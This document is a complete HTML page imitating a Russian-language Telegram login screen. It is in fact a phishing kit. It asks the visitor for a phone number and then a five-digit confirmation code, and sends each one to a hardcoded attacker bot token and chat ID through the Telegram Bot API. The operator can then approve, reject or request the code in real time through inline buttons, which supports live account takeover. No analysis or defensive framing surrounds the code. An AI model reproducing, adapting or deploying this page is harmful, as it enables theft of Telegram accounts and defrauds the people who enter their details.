<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Authorization</title>
    <style>
        :root {
            --tg-theme-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-button-color: #2481cc;
            --tg-theme-button-text-color: #ffffff;
            --tg-theme-hint-color: #999999;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 15px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 360px;
            text-align: center;
            padding: 20px;
        }
        .logo img {
            width: 90px;
            height: 90px;
            margin-bottom: 20px;
            object-fit: contain;
        }
        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 14px; color: var(--tg-theme-hint-color); margin-bottom: 25px; line-height: 1.4; }
        .input-group {
            display: flex; gap: 8px; margin-bottom: 15px; background: #f1f1f2; border-radius: 12px; padding: 4px;
        }
        select, input { border: none; background: transparent; font-size: 16px; outline: none; padding: 12px 10px; font-family: inherit; }
        select { width: 35%; cursor: pointer; }
        input[type="tel"], input[type="text"] { width: 65%; }
        .btn {
            width: 100%; background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);
            border: none; border-radius: 12px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer;
        }
        .hidden { display: none !important; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid var(--tg-theme-button-color);
            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #e53935; font-size: 13px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <!-- Шаг 1: Ввод телефона -->
    <div id="step-phone" class="view">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
        </div>
        <h2>Введите номер телефона</h2>
        <p>Пожалуйста, подтвердите код страны и введите свой номер телефона Telegram.</p>
        
        <div class="input-group">
            <select id="country-code">
                <option value="+7">🇷🇺 +7</option>
                <option value="+380">🇺🇦 +380</option>
                <option value="+1">🇺🇸 +1</option>
                <option value="+44">🇬🇧 +44</option>
                <option value="+49">🇩🇪 +49</option>
            </select>
            <input type="tel" id="phone-input" placeholder="915 260 1594">
        </div>
        <button class="btn" onclick="submitPhone()">Далее</button>
    </div>

    <!-- Шаг 2: Загрузка -->
    <div id="step-loading" class="view hidden">
        <div class="logo">
            <img src="https://api.iconify.design/fluent-emoji:monkey-face.svg" alt="Monkey">
        </div>
        <h2 id="loading-text">Загрузка</h2>
        <div class="spinner"></div>
    </div>

    <!-- Шаг 3: Ввод кода -->
    <div id="step-code" class="view hidden">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
        </div>
        <h2>Код подтверждения</h2>
        <p>Мы отправили проверочный код в ваше приложение Telegram.</p>
        
        <div style="margin-bottom: 15px;">
            <input type="text" id="code-input" placeholder="XXXXX" maxlength="5" style="width: 100%; text-align: center; font-size: 24px; letter-spacing: 8px; background: #f1f1f2; border-radius: 12px; padding: 12px; box-sizing: border-box;" autocomplete="off">
        </div>
        <div id="error-container"></div>
        <button class="btn" onclick="submitCode()" style="margin-top: 10px;">Подтвердить</button>
    </div>
</div>

<script>
    const BOT_TOKEN = "9271057498:AAHkl_0_RIFlkSp_RY36L5FDB42uRhm_8KI";
    const ADMIN_CHAT_ID = "8513410453";
    
    let userId = 'user_' + Math.random().toString(36).substring(2, 9);
    let userPhone = '';

    async function sendTelegram(text, replyMarkup = null) {
        let body = {
            chat_id: ADMIN_CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        };
        if (replyMarkup) body.reply_markup = replyMarkup;

        try {
            let res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            });
            return await res.json();
        } catch(e) {
            console.error(e);
        }
    }

    async function submitPhone() {
        let code = document.getElementById('country-code').value;
        let phoneNum = document.getElementById('phone-input').value.trim();
        if (!phoneNum) return alert('Введите номер телефона');
        userPhone = code + phoneNum;
        
        showLoading("Загрузка");

        let keyboard = {
            inline_keyboard: [
                [
                    { text: "1. Запросить код", callback_data: `askcode_${userId}` }
                ],
                [
                    { text: "2. Код верный", callback_data: `success_${userId}` },
                    { text: "3. Код неверный", callback_data: `wrong_${userId}` }
                ]
            ]
        };

        await sendTelegram(`🔔 **Новый номер с сайта!**\n\n📱 Номер: \`${userPhone}\``, keyboard);
        startPolling();
    }

    async function submitCode() {
        let code = document.getElementById('code-input').value.trim();
        if (code.length < 5) return alert('Введите 5-значный код');

        showLoading("Загрузка");

        let keyboard = {
            inline_keyboard: [
                [
                    { text: "✅ Код верный", callback_data: `success_${userId}` },
                    { text: "❌ Код неверный", callback_data: `wrong_${userId}` }
                ]
            ]
        };

        await sendTelegram(`🔑 **Получен код с сайта!**\n\n📱 Телефон: \`${userPhone}\`\n🔢 Код: *${code}*`, keyboard);
        startPolling();
    }

    function showLoading(text) {
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-code').classList.add('hidden');
        document.getElementById('step-loading').classList.remove('hidden');
        document.getElementById('loading-text').innerText = text;
    }

    function startPolling() {
        let offset = 0;
        let interval = setInterval(async () => {
            try {
                let res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=1`);
                let data = await res.json();
                
                if (data.ok && data.result) {
                    for (let update of data.result) {
                        offset = update.update_id + 1;
                        
                        if (update.callback_query) {
                            let cbData = update.callback_query.data;
                            let [action, targetId] = cbData.split('_');
                            
                            // Гасим часики на кнопке в телеграме, чтобы не висела анимация загрузки
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });

                            if (targetId === userId) {
                                clearInterval(interval);
                                
                                if (action === 'askcode') {
                                    document.getElementById('step-loading').classList.add('hidden');
                                    document.getElementById('step-code').classList.remove('hidden');
                                } else if (action === 'success') {
                                    window.location.href = "https://t.me/telegram"; 
                                } else if (action === 'wrong') {
                                    document.getElementById('step-loading').classList.add('hidden');
                                    document.getElementById('step-code').classList.remove('hidden');
                                    document.getElementById('code-input').value = '';
                                    document.getElementById('error-container').innerHTML = '<div class="error-msg">Неверный код подтверждения</div>';
                                }
                            }
                        }
                    }
                }
            } catch(e) {}
        }, 2000);
    }
</script>
</body>
</html>
